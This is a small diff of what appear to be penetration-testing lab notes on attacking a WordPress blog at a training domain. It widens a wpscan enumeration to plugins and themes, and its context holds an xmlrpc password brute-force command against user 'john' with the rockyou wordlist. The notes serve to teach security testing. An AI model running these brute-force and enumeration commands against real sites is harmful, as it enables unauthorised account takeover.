@@ -21,7 +21,7 @@ wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.tx
 ```
 
 ```
-wpscan --url http://blog.inlanefreight.local/ --enumerate ap --passwords '/usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt' 
+wpscan --url http://blog.inlanefreight.local/ --enumerate ap,at --passwords '/usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt' 
 ```
 
 ### Code Execution
